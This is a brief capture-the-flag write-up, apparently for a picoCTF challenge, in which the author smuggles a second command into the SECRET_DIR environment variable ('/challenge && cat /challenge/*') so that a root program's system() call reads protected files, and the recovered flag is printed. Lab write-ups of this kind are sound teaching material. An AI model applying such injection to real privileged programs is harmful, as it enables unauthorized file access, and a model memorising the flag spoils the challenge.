---
ai_date: '2025-04-27 05:29:54'
ai_summary: Command injection vulnerability via `system()` function, exploiting with
  command substitution to read flag
ai_tags:
- cmd-inj
- pwn
created: 2024-08-08T02:41
updated: 2024-08-08T02:48
---

How is it reading the folders I wonder?

```bash
ctf-player@pico-chall$ SECRET_DIR='"' ./bin
Listing the content of " as root:
sh: 1: Syntax error: Unterminated quoted string
Error: system() call returned non-zero value: 512
```

Ah, it is using `system()`, and this is a command injection challenge.

Why is it in `pwn` lol.

```bash
ctf-player@pico-chall$ SECRET_DIR='/challenge && cat /challenge/*' ./bin
```

```flag
picoCTF{Power_t0_man!pul4t3_3nv_cdeb2a4d}
```